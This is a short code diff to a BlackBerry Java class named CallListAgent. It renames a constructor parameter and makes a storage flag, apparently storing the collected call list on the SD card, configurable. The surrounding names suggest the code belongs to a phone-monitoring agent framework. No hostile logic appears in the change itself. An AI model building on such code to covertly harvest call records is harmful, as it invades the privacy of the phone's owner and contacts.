@@ -12,6 +12,7 @@ import java.util.Date;
 
 import net.rim.device.api.util.DataBuffer;
 import blackberry.AppListener;
+import blackberry.config.Conf;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.interfaces.CallListObserver;
@@ -33,8 +34,8 @@ public final class CallListAgent extends Agent implements CallListObserver {
      * @param agentStatus
      *            the agent status
      */
-    public CallListAgent(final boolean agentStatus) {
-        super(Agent.AGENT_CALLLIST, agentStatus, true, "CallListAgent");
+    public CallListAgent(final boolean agentEnabled) {
+        super(Agent.AGENT_CALLLIST, agentEnabled, Conf.AGENT_CALLIST_ON_SD, "CallListAgent");
 
     }
 
